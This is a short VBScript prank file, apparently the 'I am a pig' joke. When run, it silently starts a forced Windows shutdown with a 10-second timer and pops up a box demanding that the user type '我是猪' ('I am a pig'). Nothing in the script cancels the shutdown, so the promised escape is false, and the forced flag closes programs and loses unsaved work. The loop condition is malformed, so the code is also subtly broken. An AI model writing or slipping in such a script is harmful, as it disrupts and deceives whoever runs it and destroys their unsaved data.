Option Explicit
On Error Resume Next
Dim answer
Dim WshShell
set WshShell = CreateObject("wscript.Shell")
WshShell.Run "Shutdown /f /s /t 10 /c 输入'我是猪'，否则10秒后关机~",0
Do While answer<"我是猪">
answer=InputBox("输入'我是猪'，否则10秒后关机~","哈哈哈",,7000,8000)
Loop